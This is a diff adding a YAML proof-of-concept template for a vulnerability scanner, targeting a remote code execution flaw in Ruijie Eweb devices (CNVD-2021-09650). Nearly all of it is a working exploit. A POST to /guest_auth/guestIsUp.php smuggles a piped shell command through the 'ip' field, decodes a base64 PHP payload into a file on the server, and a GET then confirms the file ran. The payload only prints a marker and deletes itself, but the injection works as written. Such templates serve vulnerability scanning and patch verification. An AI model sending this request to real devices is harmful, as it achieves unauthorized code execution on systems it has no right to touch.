@@ -1,0 +1,28 @@
+id: poc-yaml-ruijie-eweb-rce-cnvd-2021-09650
+info:
+  name: Ruijie Eweb 远程代码执行漏洞(CNVD-2021-09650)
+  severity: high
+  tags:
+  - 两高一弱
+  - rce
+  - CNVD-2021-09650
+  finger: Ruijie Eweb
+  reference: []
+  description: null
+variables:
+  r1: random_int(1000,10000)
+  r2: md5(r1)
+  phpcode: '"<?php echo ''" + r2 + "''; unlink(__FILE__); ?>"
+
+    '
+  payload: base64(phpcode)
+transport: http
+requests:
+- method: POST
+  path: /guest_auth/guestIsUp.php
+  headers: {}
+  data: ip=127.0.0.1|echo '{{.payload}}' | base64 -d > {{.r1}}.php&mac=00-00
+  expression: status_code == 200
+- method: GET
+  path: /guest_auth/{{.r1}}.php
+  expression: status_code == 200 && contains(body, r2)
